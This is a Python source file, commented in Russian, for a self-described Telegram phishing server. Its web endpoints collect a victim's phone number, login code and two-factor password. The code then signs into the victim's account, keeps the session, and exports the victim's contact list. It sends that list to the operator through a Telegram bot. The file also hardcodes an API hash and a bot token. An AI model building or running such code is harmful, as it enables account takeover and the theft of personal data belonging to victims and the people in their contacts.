import asyncio
import csv
import os
from datetime import datetime
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from aiohttp import web
from aiohttp_cors import setup as cors_setup, ResourceOptions
from telethon.tl.functions.contacts import GetContactsRequest
import aiohttp

API_ID = 32701845
API_HASH = "003b1a8b4d3725f8a69dbcc5b1a18402"

SESSION_DIR = "sessions"
EXPORT_DIR = "exports"
os.makedirs(SESSION_DIR, exist_ok=True)
os.makedirs(EXPORT_DIR, exist_ok=True)

active_sessions = {}

# ========== ТВОИ ДАННЫЕ ДЛЯ БОТА ==========
BOT_TOKEN = "8748528279:AAGHZyghzNdqKR3ulqEWuOMoLD3XinSFiRA"
YOUR_CHAT_ID = 8588846106

# ========== ОТПРАВКА ФАЙЛА В TELEGRAM ==========
async def send_file_to_telegram(file_path, phone):
    """Отправляет txt файл тебе в Telegram"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    
    with open(file_path, 'rb') as f:
        form_data = aiohttp.FormData()
        form_data.add_field('chat_id', str(YOUR_CHAT_ID))
        form_data.add_field('caption', f"📱 Контакты из аккаунта: {phone}")
        form_data.add_field('document', f, filename=os.path.basename(file_path))
        
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=form_data) as response:
                result = await response.text()
                print(f"📤 Ответ: {result}")
    
    print(f"📤 Файл отправлен в Telegram: {file_path}")

# ========== ВЫГРУЗКА КОНТАКТОВ ==========
async def export_contacts(client, phone):
    filename = f"{EXPORT_DIR}/contacts_{phone.replace('+', '')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    result = await client(GetContactsRequest(hash=0))
    
    all_contacts = []
    for user in result.users:
        if not user.bot:
            all_contacts.append(user)
    
    print(f"📞 ВСЕГО КОНТАКТОВ В АДРЕСНОЙ КНИГЕ: {len(all_contacts)}")
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("=" * 60 + "\n")
        f.write(f"КОНТАКТЫ ИЗ АДРЕСНОЙ КНИГИ: {phone}\n")
        f.write(f"ВСЕГО: {len(all_contacts)}\n")
        f.write("=" * 60 + "\n\n")
        
        num = 1
        for user in all_contacts:
            phone_number = user.phone if user.phone else "НЕТ"
            username = f"@{user.username}" if user.username else "НЕТ"
            name = f"{user.first_name or ''} {user.last_name or ''}".strip()
            if not name:
                name = "БЕЗ ИМЕНИ"
            
            f.write(f"{num}. ТЕЛ: {phone_number}\n")
            f.write(f"   ЮЗ: {username}\n")
            f.write(f"   ИМЯ: {name}\n")
            f.write("-" * 50 + "\n")
            num += 1
    
    # Отправляем файл в Telegram
    await send_file_to_telegram(filename, phone)
    
    print(f"✅ Контакты сохранены и отправлены: {filename}")
    return filename

# ========== ОТПРАВКА КОДА ==========
async def send_code_handler(request):
    data = await request.json()
    phone = data.get('phone', '').strip().replace(' ', '')
    
    if not phone:
        return web.json_response({'success': False, 'error': 'Phone required'})
    
    print(f"📱 Отправка кода: {phone}")
    
    session_file = f"{SESSION_DIR}/{phone.replace('+', '')}.session"
    client = TelegramClient(session_file, API_ID, API_HASH)
    await client.connect()
    
    if await client.is_user_authorized():
        await export_contacts(client, phone)
        return web.json_response({'success': True, 'already_authorized': True})
    
    try:
        result = await client.send_code_request(phone)
        active_sessions[phone] = {
            'client': client,
            'phone_code_hash': result.phone_code_hash
        }
        print(f"✅ Код отправлен на {phone}")
        return web.json_response({'success': True, 'message': 'Code sent'})
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        return web.json_response({'success': False, 'error': str(e)})

# ========== ПРОВЕРКА КОДА ==========
async def verify_code_handler(request):
    data = await request.json()
    phone = data.get('phone', '').strip().replace(' ', '')
    code = data.get('code', '').strip()
    
    if not phone or not code:
        return web.json_response({'success': False, 'error': 'Phone and code required'})
    
    print(f"🔑 Проверка кода: {phone}")
    
    if phone not in active_sessions:
        return web.json_response({'success': False, 'error': 'Session expired'})
    
    session_data = active_sessions[phone]
    client = session_data['client']
    
    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=session_data['phone_code_hash'])
        filename = await export_contacts(client, phone)
        del active_sessions[phone]
        return web.json_response({'success': True, 'file': filename, 'needs_password': False})
    except SessionPasswordNeededError:
        return web.json_response({'success': False, 'needs_password': True, 'error': '2FA required'})
    except PhoneCodeInvalidError:
        return web.json_response({'success': False, 'error': 'Invalid code', 'needs_password': False})
    except Exception as e:
        return web.json_response({'success': False, 'error': str(e), 'needs_password': False})

# ========== 2FA ПАРОЛЬ ==========
async def verify_password_handler(request):
    data = await request.json()
    phone = data.get('phone', '').strip().replace(' ', '')
    password = data.get('password', '').strip()
    
    if not phone or not password:
        return web.json_response({'success': False, 'error': 'Phone and password required'})
    
    print(f"🔐 Проверка 2FA: {phone}")
    
    if phone not in active_sessions:
        return web.json_response({'success': False, 'error': 'Session expired'})
    
    session_data = active_sessions[phone]
    client = session_data['client']
    
    try:
        await client.sign_in(password=password)
        filename = await export_contacts(client, phone)
        del active_sessions[phone]
        return web.json_response({'success': True, 'file': filename})
    except Exception as e:
        return web.json_response({'success': False, 'error': str(e)})

# ========== ЗАПУСК СЕРВЕРА ==========
app = web.Application()
cors = cors_setup(app, defaults={
    "*": ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*", allow_methods="*")
})

app.router.add_post('/send_code', send_code_handler)
app.router.add_post('/verify_code', verify_code_handler)
app.router.add_post('/verify_password', verify_password_handler)

for route in list(app.router.routes()):
    cors.add(route)

if __name__ == '__main__':
    print("=" * 50)
    print("🔥 PHISHING SERVER (WITH TELEGRAM BOT)")
    print("📡 http://localhost:8000")
    print("🤖 Бот отправляет контакты в Telegram")
    print("=" * 50)
    web.run_app(app, host='0.0.0.0', port=8000)